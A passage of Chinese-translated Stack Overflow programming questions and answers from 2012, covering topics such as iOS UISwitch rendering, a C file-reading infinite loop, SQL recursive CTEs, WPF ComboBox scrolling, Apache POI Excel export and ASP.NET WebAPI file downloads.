谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T09:01:39.460

Flurry 通过其新的 SDK v3.x 为 Android 应用程序提供 Full Stack Trace 崩溃报告。此功能也将很快引入 iOS 应用程序。欲了解更多详情，请写信至 support@flurry.com（全面披露：我在 Flurry 的支持团队工作）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-06T13:48:16.077

Flurry SDK (>= v4.3) 的新版本现在支持[崩溃分析](http://support.flurry.com/index.php?title=Analytics/FAQ/CrashAnalytics)，所以我认为`uncaughtExceptionHandler`不再需要使用了。

# asp.net-mvc - Mvc 3 中同步操作的进度条

> ID：13271741
> 
> 赞同：1
> 
> 时间：2012-11-07T14:27:27.133
> 
> 标签：asp.net-mvc, asp.net-mvc-3, c#-4.0, attributes

我在我的 Mvc 3 应用程序中对 MainFrame 进行了长时间的同步调用，我想创建一个自定义属性来装饰我的控制器操作，我知道这可能需要很长时间。如果控制器用这个属性装饰，我需要渲染“加载消息”

请问有什么想法，可以实现吗？

# java - 从浏览器调用 API URL，而不是将其包含在 jsp 页面中并从服务器调用

> ID：13271742
> 
> 赞同：0
> 
> 时间：2012-11-07T14:27:29.283
> 
> 标签：java, jsp, jspinclude

在我的 JSP 页面中，我正在导入一些提供一些图像的 api url。

我的服务器阻止了 api url，但我的浏览器显示了那些来自 api url 的图像。

我的问题是有什么方法可以从浏览器本身调用 url 而不是从服务器端调用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:44:25.033

如果您使用的 API 仅返回图像，您可以简单地使用`<img src="http://your.api.url/" />`.

否则，您可以使用 JavaScript 调用 URL，如此[处](https://stackoverflow.com/a/4075498/1225328)所述。

# objective-c - 非视网膜屏幕上的 UISwitch

> ID：13271754
> 
> 赞同：1
> 
> 时间：2012-11-07T14:28:04.403
> 
> 标签：objective-c, ios, uiswitch, iphone-3gs

我正在创建一个`UISwitch`in `TableViewCell`。

在视网膜显示器上看起来不错。

但是当我在 3GS 上构建一个项目时，我`UISwitch`看起来就像一幅画得很糟糕的画。

[http://iwheelbuy.com/stackoverflow/asdf.png](http://iwheelbuy.com/stackoverflow/asdf.png)

我的代码

```
{
    ...
    cell.textLabel.text = NSLocalizedString(@"settings model glare", nil);
    UISwitch *cellSwitch = [self switchWithTitle:@"glare"];
    [cellSwitch setCenter:CGPointMake(260.0f, cell.frame.size.height / 2)];
    [cell addSubview:cellSwitch];
    ...
}

- (UISwitch *) switchWithTitle:(NSString *)_title
{
    BOOL switchState;
    if ([[NSUserDefaults standardUserDefaults] boolForKey:_title] == NO)
    {
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:_title];
        [[NSUserDefaults standardUserDefaults] synchronize];
    }
    switchState = [[NSUserDefaults standardUserDefaults] boolForKey:_title];
    UISwitch *switchForCell = [[UISwitch alloc] initWithFrame:CGRectZero];
    if ([_title isEqualToString:@"glare"])
        [switchForCell addTarget:self action:@selector(changedValueForGlare) forControlEvents:UIControlEventValueChanged];
    else
        [switchForCell addTarget:self action:@selector(changedValueForShadow) forControlEvents:UIControlEventValueChanged];
    [switchForCell setOn:switchState];
    return switchForCell;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T15:23:18.717

首先，在这种情况下，将开关设置为`accessoryView`单元格并让它担心定位会更容易。

您看到模糊图像的原因是您的开关框架的原点位于半像素上。您正在设置`center`开关的，所以它的原点取决于开关的大小（这是固定的，因为`UISwitch`总是使用系统定义的大小）。假设开关的尺寸为 79 x 27（标准尺寸），将中心的 y 坐标设置为 20 会导致框架原点的 y 坐标为 6.5 (20.0 - 27.0 * 0.5)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:33:04.877

不知道你所说的“画得不好”是什么意思。是不是看起来很模糊？这可能是因为它的框架没有设置为一个完整的点。

你的细胞高度是多少？以下行可能会导致 UISwitch 设置为 0.5 个点：

```
[cellSwitch setCenter:CGPointMake(260.0f, cell.frame.size.height / 2)]; 
```

这在 Retina 上很好，因为它仍然是一个完整的像素，但在非 Retina 上它是 0.5 个像素（因为点 = 非 Retina 上的像素和点 = Retina 上的 2 个像素）。

# c - 尝试从文件中读取时出现无限循环

> ID：13271755
> 
> 赞同：3
> 
> 时间：2012-11-07T14:28:07.897
> 
> 标签：c, file, fopen, infinite-loop

我想从文件中读取字节然后重写它们。我确实喜欢这样：

```
FILE *fp;
int cCurrent;
long currentPos;

/* check if the file is openable */
if( (fp = fopen(szFileName, "r+")) != NULL )
{
    /* loop for each byte in the file crypt and rewrite */
    while(cCurrent != EOF)
    {
        /* save current position */
        currentPos = ftell(fp);
        /* get the current byte */
        cCurrent = fgetc(fp);
        /* XOR it */
        cCurrent ^= 0x10;
        /* take the position indicator back to the last position */
        fseek(fp, currentPos, SEEK_SET);
        /* set the current byte */
        fputc(cCurrent, fp);
    } 
```

在文件上执行代码后，文件的大小在无限循环中增加。

我的代码有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:29:57.767

即使它等于 ，您也`XOR`正在`cCurrent`使用。一旦你，它就不再是，所以你的循环永远不会终止。`0x10``EOF``XOR``EOF`

使循环无限，并在看到 时从中间退出`EOF`，如下所示：

```
for (;;)  {
    /* save current position */
    currentPos = ftell(fp);
    /* get the current byte */
    if ((cCurrent = fgetc(fp)) == EOF) {
        break;
    }
    /* XOR it */
    cCurrent ^= 0x10;
    /* take the position indicator back to the last position */
    fseek(fp, currentPos, SEEK_SET);
    /* set the current byte */
    fputc(cCurrent, fp);
    /* reset stream for next read operation */
    fseek(fp, 0L, SEEK_CUR);
} 
```

# objective-c - 设备 iOS 上的 FB SDK 崩溃

> ID：13271758
> 
> 赞同：0
> 
> 时间：2012-11-07T14:28:30.330
> 
> 标签：objective-c, ios, facebook-graph-api, single-sign-on

我正在尝试通过 hellofabcebook 示例使用 FB SDK for iOS 将照片上传到 Facebook。我正在正确执行所有步骤，但应用程序在设备上崩溃。它在模拟器上运行良好。在 AppDelegate

```
- (BOOL)application:(UIApplication *)application
        openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication
     annotation:(id)annotation {
// attempt to extract a token from the url
return [FBSession.activeSession handleOpenURL:url]; 
```

}

在视图控制器 viewDidLoad 方法中

```
loginview =
[[FBLoginView alloc] initWithPermissions:[NSArray arrayWithObject:@"status_update"]];

loginview.frame = CGRectOffset(loginview.frame, 5, 5);
loginview.delegate = self;

[self.view addSubview:loginview]; 
```

当我单击 loginview 的登录按钮时，它会打开一个网页，要求登录...在登录应用程序崩溃后。这种行为非常不确定，因为它在模拟器、iPhone4 设备上运行良好，但在 iPhone3g 上运行良好。即使在 iPhone4 中，它有时也会崩溃，但并非总是如此。

# wordpress - 在永久链接中保留 Wordpress 自定义分类标记

> ID：13271762
> 
> 赞同：2
> 
> 时间：2012-11-07T14:28:42.167
> 
> 标签：wordpress, rewrite, custom-taxonomy

在 wordpress 中，我需要在永久链接前面加上一个自定义分类标记，比如说 %writer% 并在此之后维护标准类别结构。

例如

/史蒂夫布鲁克斯/小说/惊悚片/

小说/惊悚片是标准的层次类别结构。所以我不需要为每个作家重新创建类别结构。

我可以在获取 get_query_var('writer'); 的会话变量中保留这个标签没有问题；并修改 url 以适应使用它来持久化 writer 标签。这会在浏览类别时维护标签。直到你回去换编剧。

我以为我已经实现了这一点，但是为永久链接添加前缀似乎会引发页面抛出 404 错误的问题，因为页面没有类别前缀，并且 WP 认为页面名称是作者。

我可以将标签附加到永久链接的末尾，没有问题：

/%category%/%postname%/%writer%/ /novels/thrillers/steve-brookes/

所有作品都按预期工作，包括页面。

但是这样做：

/%writer%/%postname%/%category%/ /steve-brookes/thrillers/novels/

导致页面抛出 404 错误。

我知道在 SO 和网络上有很多关于此的帖子，但似乎没有涵盖这一点。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-04-01T08:48:45.990

现在处理同样的问题。试图在我的永久链接的开头添加我的分类学 slug。似乎当您使第一个永久链接部分成为动态时，它会与页面结构产生冲突，该结构仅由一个动态部分组成 - %pagename%。我没有成功重写规则来绕过它。我发现的唯一解决方法是使页面永久结构更具体：

```
global $wp_rewrite;
$wp_rewrite->page_structure = 'page/%pagename%'; 
```

# architecture - CQRS 中的一辆巴士还是单独的巴士？

> ID：13271763
> 
> 赞同：3
> 
> 时间：2012-11-07T14:28:47.520
> 
> 标签：architecture, cqrs, servicebus

我想知道我是否应该有一个总线来注册我的命令/事件和命令处理程序/事件处理程序，或者我的应用程序现在有许多有界上下文，我应该有单独的总线吗？

优缺点都有什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T19:20:53.950

总线应该主要被视为基础设施问题，而不是域问题。您将如何部署您的应用程序？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T20:20:10.327

总线是一种传输，如果您的某些上下文的消息流量较低，您可以为它们使用单​​个总线，但对于其他一些上下文，您将需要多条总线来传输一个上下文消息。

# sql - 使用 CTE 拆分表中的行

> ID：13271764
> 
> 赞同：2
> 
> 时间：2012-11-07T14:28:52.897
> 
> 标签：sql, sql-server, sql-server-2008-r2, common-table-expression

我在 SQL Server 2008 R2 的表中有以下行

```
+-------------------------------------------+
|  ID          EntryType dt         price   |
+-------------------------------------------+
| 14          4         2012-11-07 0.025000 |
| 16          5         2012-11-07 0.026000 |
| 18          6         2012-11-07 0.026000 |
| 20          7         2012-11-07 0.026000 |
+-------------------------------------------+ 
```

我想做的是根据 EntryType 传播行（EntryType 不会改变）

```
For EntryType = 4 (1 row)
For EntryType = 5 (2 row)
For EntryType = 6 (3 row)
For EntryType = 7 (9 row) 
```

并且 dt 字段将递增（以 Month 间隔），因此输出如下所示：

```
+-----------+-----------+-------+
| EntryType |    dt     | Price |
+-----------+-----------+-------+
|         4 | 11/7/2012 | 0.024 |
|         5 | 12/7/2012 | 0.025 |
|         5 | 1/7/2013  | 0.025 |
|         6 | 2/7/2013  | 0.026 |
|         6 | 3/7/2013  | 0.026 |
|         6 | 4/7/2013  | 0.026 |
|         7 | 5/7/2013  | 0.027 |
|         7 | 6/7/2013  | 0.027 |
|         7 | 7/7/2013  | 0.027 |
|         7 | 8/7/2013  | 0.027 |
|         7 | 9/7/2013  | 0.027 |
|         7 | 10/7/2013 | 0.027 |
|         7 | 11/7/2013 | 0.027 |
|         7 | 12/7/2013 | 0.027 |
|         7 | 1/7/2014  | 0.027 |
+-----------+-----------+-------+ 
```

是否可以使用 CTE 和 SQL 做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T16:08:04.607

这是在[递归 CTE](http://msdn.microsoft.com/en-us/library/ms186243.aspx)中执行此操作的一种方法：

```
;with RecordCounts as (
    -- Establish row counts for each EntryType
    select 4 as EntryType, 1 as RecordCount
    union all select 5, 2
    union all select 6, 3
    union all select 7, 9
), PricesCte as (
    -- Get initial set of records
    select ID, p.EntryType, (select min(dt) from MyTable) as dt, price, 1 as RecordNum
    from MyTable p
        join RecordCounts c on p.EntryType = c.EntryType -- Only get rows where we've established a RecordCount
    -- Add records recursively according to RecordCount
    union all
    select ID, p.EntryType, dt, price, RecordNum + 1
    from PricesCte p
        join RecordCounts c on p.EntryType = c.EntryType
    where RecordNum + 1 <= c.RecordCount
)
select EntryType,
    dateadd(mm, row_number() over (order by EntryType, ID) - 1, dt) as dt,
    price
from PricesCTE
order by EntryType
option (maxrecursion 0) -- Infinite recursion, default limit is 100 
```

这是展示这项工作的[SqlFiddle 。](http://www.sqlfiddle.com/#!3/2f866/1)

有几件事：

*   我认为随着记录数量的增加，使用[Tally 表](http://www.sqlservercentral.com/articles/T-SQL/62867/)而不是递归来乘以记录可能会更好。您将与 Tally 表交叉连接，并让 where 子句根据 RecordCount 限制记录
*   我看不出价格应该如何从输入变为输出。
*   我不知道您在哪里建立每个 EntryType 的 RecordCount，所以我已将其添加到另一个 CTE 中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T16:22:59.110

```
;WITH e (ID, EntryType, row, dt, Price, [Len])
AS
 (
  SELECT ID, EntryType, CASE EntryType WHEN 4 THEN 1
                                       WHEN 5 THEN 2
                                       WHEN 6 THEN 3
                                       WHEN 7 THEN 9 END AS row,
         dt, Price, 0 AS [Len] 
  FROM dbo.your_table
), x (ID, EntryType, row, dt, Price, [Len]) AS
 (
  SELECT ID, EntryType, row, dt, Price, 1
  FROM e
  UNION ALL
  SELECT e.ID, e.EntryType, e.row, e.dt, e.Price, x.[Len] + 1
  FROM e , x
  WHERE e.ID = x.ID AND e.row > x.[Len]
  )
SELECT EntryType, DATEADD(mm, ROW_NUMBER() OVER(ORDER BY EntryType)-1, dt) AS dt, Price
FROM x
ORDER BY EntryType 
```

唯一我不明白的标准是什么标准来接收价格？

[SQL Fiddle](http://sqlfiddle.com/#!3/8a10b/1/0)演示

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T15:47:06.550

不确定 CTE 是否可以做到这一点，因为我无法分辨 EntryType 和行数之间的任何逻辑。

对于这个问题，我认为用你想要的行数构建一个临时表更容易

```
DECLARE @Entry TABLE(EntryType INT, seq INT) 
INSERT INTO @Entry (EntryType , seq) VALUES
    (4,1)
    ,(5,1)
    ,(5,2)
    ,(6,1)
    ...
    ,(7,1)
    ..
    ,(7,9) 
```

之后，一个简单的查询将得到相同的结果

```
SELECT  t.EntryType , DATEADD(MONTH,e.seq,  t.dt) as dt,t.Price 
FROM    YourTable t
INNER JOIN @Entry e 
    ON  t.EntryType = e.EntryType 
```

# c# - PHP 网站如何与 Java 和 C# 程序高效通信

> ID：13271772
> 
> 赞同：4
> 
> 时间：2012-11-07T14:29:16.470
> 
> 标签：c#, java, php, web, interop

我有一个用 PHP 编写的网站，该网站接受用不同编程语言（Java 和 C#）编写的代码片段并执行一些静态分析并将结果返回给用户。我已经分别为 Java 和 C# 编写了不同的分析器。Java 分析器是用 Java 编写的；C# 分析器是用 C# 编写的。

我的问题是 PHP 网站如何以有效的方式与那些用不同语言编写的分析器进行通信。即：当PHP网站接收到一些Java代码时，可以调用Java分析器等。我当然可以使用PHP的exec来启动分析器进程，但这太慢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:47:44.843

我会使用 Web Services，因为它们易于开发、可扩展、可扩展、独立于平台、独立于语言，并且支持标准的 http 协议；不确定您是否会使用 SOA 提供的所有优势，可能这不是最好的方法，但我会选择它。

希望能帮助到你。

[网络服务](http://en.wikipedia.org/wiki/Web_service)

[Web 服务教程](http://www.w3schools.com/webservices/default.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:33:06.930

对于 C#，我将它作为 Windows 服务托管，然后设置为 REST 配置的自托管 WCF 服务。然后，网络服务器 (PHP) 将使用 REST 进行通信

我想你可以用 Java 程序做类似的事情，但我不知道如何将它作为服务运行

# ssrs-2008 - SSRS-2008 交互式排序当前排序列

> ID：13271774
> 
> 赞同：1
> 
> 时间：2012-11-07T14:29:19.170
> 
> 标签：ssrs-2008

VS2010 - SSRS 2008

在使用交互式排序时，我需要托管网页 (.aspx) 知道报告当前在哪个字段/列上排序。

任何帮助，将不胜感激 ！！

谢谢

大卫

# networking - 如何修复 WSAECONNABORTED 错误？

> ID：13271776
> 
> 赞同：3
> 
> 时间：2012-11-07T14:29:25.600
> 
> 标签：networking, tcp

我有一个 C/S 应用程序。客户端通常使用 TCP 协议向服务器发送大量数据。它在 LAN 环境（10MB/s）中运行良好，但是当我将它迁移到 WAN 环境（200KB/s）时会发生网络错误。

当我跟踪错误时，我发现`send()`在客户端返回 -1 并首先`WSAGetLastError()`返回`WSAECONNABORTED`；几秒钟后，`recv()`in server 也返回 -1 和`errno`is `ECONNRESET`。

`WSAECONNABORTED`查阅文档后，对和有了基本的了解`ECONNRESET`。我认为前者是由于网络不好造成的：TCP在几次重传失败后关闭了套接字。后者是由于客户端意外关闭操作造成的。

我想知道如何处理这种错误。立即重新连接？或者任何套接字选项可以提供帮助？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-03-10T20:39:44.207

你是对的。

前者是网络问题造成的。您所能做的就是使用新的套接字重试。

后者是应用程序协议错误。您在对等方已经关闭时发送。这是一个应用程序错误。解决方法是修复错误。

# wpf - 在可编辑的 ComboBox 中禁用 MouseWheel 作为 ItemTemplate

> ID：13271777
> 
> 赞同：8
> 
> 时间：2012-11-07T14:29:28.440
> 
> 标签：wpf, combobox, listbox, mousewheel, itemtemplate

我在 ListBox 中使用 ComboBox 作为 ItemTemplate。我的 ComboBox 是可编辑的。当用户在组合框中使用鼠标滚轮时，它会更改当前值。我不想要那个。我希望 ListBox 滚动。有什么解决办法吗？我发现的大多数示例仅基于只读 ComboBox。似乎我找到的解决方案都不起作用。覆盖 OnMouseWheel 设置 isHandled = true 不起作用，似乎该事件在其他地方处理。我试图在我的 ComboBox 的 ControlTemplate 使用的 TextBox 中覆盖 OnMouseWheel ，但没有成功。

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T10:45:48.480

好的，我的错误，我将 PreviewMouseWheel 放在了我的 ItemTemplate 的错误 UIElement 上。所以这是有效的：

```
private void myCombo_PreviewMouseWheel(object sender, MouseWheelEventArgs e)
{
    e.Handled = true;
} 
```

尽管如此，“parentListBox.RaiseEvent(args);” 不起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-06T18:36:32.547

我用行为（以及@XamlZealot 提供的逻辑）解决了您的问题：

```
internal class ComboBoxIsNotScrollingItemsBehavior : Behavior<ComboBox>
{
    protected override void OnAttached()
    {
        this.AssociatedObject.PreviewMouseWheel += this.ComboBox_PreviewMouseWheel;
    }

    protected override void OnDetaching()
    {
        this.AssociatedObject.PreviewMouseWheel -= this.ComboBox_PreviewMouseWheel;
    }

    private void ComboBox_PreviewMouseWheel(object sender, MouseWheelEventArgs e)
    {
        if (this.AssociatedObject.IsDropDownOpen == false)
        {
            e.Handled = true;

            ((FrameworkElement)this.AssociatedObject.Parent).RaiseEvent(new MouseWheelEventArgs(e.MouseDevice, e.Timestamp, e.Delta)
            {
                RoutedEvent = UIElement.MouseWheelEvent,
                Source = sender
            });
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T15:19:39.503

我曾经用以下方法解决了一个类似的问题：

WPF：

```
<ComboBox MouseWheel="ComboBox_MouseWheel"/> 
```

C＃：

```
private void ComboBox_MouseWheel(object sender, MouseWheelEventArgs e)
{
    e.Handled = true;
    MouseWheelEventArgs args = new MouseWheelEventArgs(e.MouseDevice, e.Timestamp, e.Delta);
    args.RoutedEvent = UIElement.MouseWheelEvent;
    args.Source = sender;
    parentListBox.RaiseEvent(args);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-07T16:03:17.867

尝试在构造函数中注册一个类处理程序：

```
EventManager.RegisterClassHandler(typeof(ComboBox), ComboBox.MouseWheelEvent, new RoutedEventHandler(MouseWheeled));

private void MouseWheeled(object Sender, RoutedEventArgs e)
{
    MouseWheelEventArgs mouseArgs = (MouseWheelEventArgs)e;
    e.Handled = true;
    MouseWheelEventArgs args = new MouseWheelEventArgs(mouseArgs.MouseDevice, mouseArgs.Timestamp, mouseArgs.Delta);
    args.RoutedEvent = UIElement.MouseWheelEvent;
    args.Source = Sender;
    parentListBox.RaiseEvent(args);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-07T15:41:07.543

说我们的情况是正确的吗，工具栏中的字体列表框：选择一种新字体，以前选择的字体仍然显示为选定的值，但您可以垂直滚动？

在那种情况下，您可以考虑这样的样本吗？[也创建一个字体框](http://www.dotnetperls.com/fontdialog)。

进一步参考：您可以查看这篇[MSDN 文章](http://msdn.microsoft.com/en-us/library/windows/desktop/aa511458.aspx)吗？

# algorithm - 几何图案质量和填充

> ID：13271779
> 
> 赞同：6
> 
> 时间：2012-11-07T14:29:37.767
> 
> 标签：algorithm, statistics, computational-geometry

在上图中，有一些几何图案。模型`a`距离是已知的。点严格来说不在模型距离内。

![](../Images/f86ac98aca53356c6df9ca29ac3f911c.png)

**我想要：**

*   计算每个点的质量（点之间的实际距离不是`a`）更好的点适合图案更好的质量系数它应该有（我试图采取距离和 45 度角）
*   消除错误点（我用红色标记） - 它与模式质量计算有关

**到目前为止我已经尝试过：**

1.  互相取每个点
2.  计算它们之间的距离和角度
3.  只取与当前点相邻的点（距离在`a - delta`和`a + delta`
4.  质量是 realDistance/modelDistance * realAngle/modelAngle

**为什么失败：**

*   好点质量大幅下降，附近有坏点
*   如果坏点只有一个邻居并且距离和角度还可以，那么它的质量还可以。

**所以问题是：**在这种情况下计算点质量和填充模式的最佳算法是什么。模式应通过考虑邻居位置的平均元素位置来填充。最好的答案将是伪代码或代码或对某些已知算法的引用，这在这种情况下可能会有所帮助。

[问题与我之前的问题Filling rectangle with points pattern](https://stackoverflow.com/questions/13138875/filling-rectangle-with-points-pattern)有点相关，但填充不能用错误的质量点完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T20:26:44.210

如果从左到右或从上到下时点的误差/失真没有变大（即`a`相邻好点之间的平均距离足够精确），您可以尝试以下操作：

*   当除以 a 时，通过取 x 和 y 坐标的余数将每个点 P [i]带入正方形（生成 Q [i]）。因此，好点将或多或少地映射到一个点上。`[0,a[ x [0,a[`
*   在这些生成的点Q [i]中选择一个`R`最近邻的点（例如，`1/distance`对到其他点Q [j]的所有距离求和，j≠i，并选择总和最大的点）。
*   [现在，您可以通过查看 Q i]到 R的距离来区分好点和坏点 P [i] 。（对应的 Q [i]接近 R的点 P [i将是好点。）]

如果点 R（与最近的邻居）的坐标接近 0 或 a（即 R 接近正方形的边界`[0,a[ x [0,a[`），您最好从头开始并添加`a/2`到对应的坐标（每个 P [i]之前）计算余数，以使点 R 更靠近正方形的中心。（或者您设法计算离开正方形`[0,a[ x [0,a[`的一侧并从另一侧返回正方形的不同可能性的最小距离。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T09:14:26.450

优点似乎沿网格对齐。可以使用使用[RANSAC](http://en.wikipedia.org/wiki/RANSAC)的线拟合算法找到网格线。RANSAC 线拟合是一种概率算法。您将不得不重复它，直到找到几乎水平或垂直的线。取出这条线上/附近的点，然后寻找下一条网格线。根据您的问题特征，如果剩下的点太少或在一条线上/附近的点太少，您将停止寻找新的网格线。剩下的点是坏点。当你取找到的网格线的交叉点并且在交叉点附近没有点（从所有原始点中），那么你可以在这里填写一个点。

# python - Bottle.py 服务器部署

> ID：13271782
> 
> 赞同：1
> 
> 时间：2012-11-07T14:29:46.467
> 
> 标签：python, https, web, bottle

我正在从开发转向部署，想知道如何让我的 bottle.py 应用程序同时服务 HTTP 和 HTTPS 请求，并成为多进程/多线程？我知道我需要使用像cherrypy 这样的东西而不是wsgiref？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:43:40.137

在[文档](http://bottlepy.org/docs/stable/tutorial.html#deployment)中有提高性能和多线程的想法。我为部署的版本使用不同的文件夹和端口，这样我就可以在不中断使用的情况下进行测试。

长文本在[这里](http://bottlepy.org/docs/stable/deployment.html#deployment)，包括 pasteserver 和其他几个。

# spring-mvc - 使用 Apache POI 从 Spring Controller 返回 Excel 文档

> ID：13271786
> 
> 赞同：5
> 
> 时间：2012-11-07T14:30:10.307
> 
> 标签：spring-mvc, apache-poi

我正在尝试将 Excel 文件发回给用户。在某种程度上，我的 excel 文件即使是空的也会损坏。当我打开文件时，Excel 告诉我文件已损坏。

如果我删除

```
response.getOutputStream().write(excelService.exportEventsToCSV()); 
```

我得到一个空的excel文件。

```
@RequestMapping(value = "/events/excel", method = RequestMethod.GET)
    public void getEventsAsExcel(HttpServletResponse response) {

        try {

            response.setHeader("Content-disposition", "attachment; filename=test.xls");
            response.getOutputStream().write(excelService.exportEventsToCSV());
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } 
```

我的 XML 生成非常简单。只是空文档

```
@Override
public byte[] exportEventsToCSV() {
    try {

        HSSFWorkbook workbook = new HSSFWorkbook();
        HSSFSheet worksheet = workbook.createSheet("POI Worksheet");
        HSSFCellStyle cellStyle = workbook.createCellStyle();

        workbook.write(fileOut);

        return workbook.getBytes();
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    return null;
} 
```

请任何建议。我正在考虑 Springs Excel 视图，但我不想要视图。只是一个下载的文件。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-10T21:42:35.350

您似乎在输出输出时做了一些非常奇怪的事情，我很确定这`workbook.getBytes()`并没有返回您认为的内容......

我强烈建议您更改`exportEventsToCSV`以返回工作簿，然后您可以做的更简单：

```
Workbook wb = excelService.exportEventsToCSV();
response.setHeader("Content-disposition", "attachment; filename=test.xls");
wb.write( response.getOutputStream() ); 
```

这应该可以正常工作并为最终用户提供他们所期望的那种东西

# jquery - 如何使用类在 div 上预加载多个背景图像

> ID：13271790
> 
> 赞同：0
> 
> 时间：2012-11-07T14:30:24.317
> 
> 标签：jquery, html, css

使用 jQuery 在带有类的 div 上预加载背景图像的最佳方法是什么？

```
<div id="wrapper" class="first">

</div>

.first {background:url(/image.jpg) repeat-x top center} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:37:04.810

只需使用 Image 对象或隐藏 DIV 中的 IMG 标签将它们作为常规图像预加载。然后，当您将工作 DIV 的类更改为具有预加载图像之一的 CSS 背景的类时，它将从客户端缓存中提取它。

```
.preload { display: none; }
...
<div>
    <img src="a.png" class="preload" />
    <img src="b.png" class="preload" />
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:39:58.660

如果您希望在不更改 HTML 标记的情况下进行预加载，可以使用 jQuery 执行此操作：

```
$(function(){
    $('<img/>')[0].src = "/image.jpg";
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:01:40.080

您可以使用整个图像而不是使用多个单独的图像文件，并且可以使用 CSS 背景位置功能的 xpos 和 ypos 参数。在这种情况下，只加载一个图像文件并且一次。让 CSS 和类来处理剩下的事情。这是一个例子；

```
/*this is the style*/
<style type="text/css">
    .first {
        background: url(.....) no-repeat 0px 0px;
    }
    .second {
        background: url(.....) no-repeat -200px -200px;
    }
</style>
<div id="wrapper" class="first"></div> 
```

# c# - 有什么方法可以使用 AmazonEC2 API 查看 EC2 实例的 AlarmStatus 值？

> ID：13271793
> 
> 赞同：1
> 
> 时间：2012-11-07T14:30:32.787
> 
> 标签：c#, amazon-ec2, amazon-web-services

我想知道是否有办法通过 AmazonEC2 API 查看 ec2 实例的警报状态？

![警报状态](../Images/af8764feaa527dd114e7ec842c443ceb.png)

我们已经实施了一个有效的解决方案来使用 AmazonCloudWatch.GetMetricStatistics 方法获取特定的指标值：

```
var reg = new GetMetricStatisticsRequest()
            {
                MetricName = metric,
                Period = 60 * 30,
                Statistics = new List<string> { AVERAGE },
                Dimensions = dimensions,
                Namespace = "AWS/EC2",
                EndTime = DateTime.Now.ToUniversalTime(),
                StartTime = DateTime.Parse(startTime)
            };

data.Columns.Add(AVERAGE);
data.Columns.Add(TIMESTAMP);

var points = Service.GetMetricStatistics(reg).GetMetricStatisticsResult.Datapoints.OrderBy(p => p.Timestamp); 
```

但是直接检查警报状态会更有用。

我们已经迭代了 AmazonEC2.DescribeInstancesResponse 结果，但到目前为止还没有任何乐趣。有没有人做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T17:42:14.307

为了获取警报的状态，您可以使用 AmazonCloudWatch.DescribeAlarms 方法。这是一个关于如何获取警报状态的代码示例（在 US-West-2 区域）：

```
 var cloudWatchClient = AWSClientFactory.CreateAmazonCloudWatchClient(RegionEndpoint.USWest2);
        var describeAlarmsResponse = cloudWatchClient.DescribeAlarms(new DescribeAlarmsRequest
        {
            AlarmNames = { "the_name_of_your_alarm" }
        });
        var describeAlarmsResult = describeAlarmsResponse.DescribeAlarmsResult;
        foreach (var alarm in describeAlarmsResult.MetricAlarms)
        {
            Console.WriteLine("Alarm State = " + alarm.StateValue);
            Console.WriteLine("Alarm State Reason = " + alarm.StateReason);
            Console.WriteLine("Alarm JSON Data = " + alarm.StateReasonData);
        } 
```

# c# - ASP.net WebAPI 通过 ajax 调用返回文件

> ID：13271804
> 
> 赞同：4
> 
> 时间：2012-11-07T14:30:57.033
> 
> 标签：c#, ajax, asp.net-mvc, asp.net-web-api

我目前正在寻找一种方法来强制下载通过 WebAPI 控制器返回的文件。

我使用[http://www.shawnmclean.com/blog/2012/04/force-download-of-file-from-asp-net-webapi/](http://www.shawnmclean.com/blog/2012/04/force-download-of-file-from-asp-net-webapi/)作为参考。

在我的客户端上，我使用 ajax GET 调用来发送对象的 ID 并尝试下载文件

```
 exportList: (foo, callback) =>
        path = '/api/export/id'
        path = path.replace("id", foo.id)
        $.ajax(
            url: path,
            dataType: 'text',
            success: (data) =>
                callback(data)
            error: (data) =>
                callback(false)
        ) 
```

在服务器端，我将上面的 URI 路由到下面的方法

```
 [AcceptVerbs("GET")]
    public HttpResponseMessage ExportList(int id)
    {
        string file = fooService.ExportList(id);

        if (file == null)
        {
            return Request.CreateResponse(HttpStatusCode.NoContent);
        }
        HttpResponseMessage result = new HttpResponseMessage(HttpStatusCode.OK);
        result.Content = new StringContent(file);
        result.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        result.Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment");
        result.Content.Headers.ContentDisposition.FileName = "List.csv";

        return result;
    } 
```

fooService.ExportList 方法只是创建一个 csv 字符串。

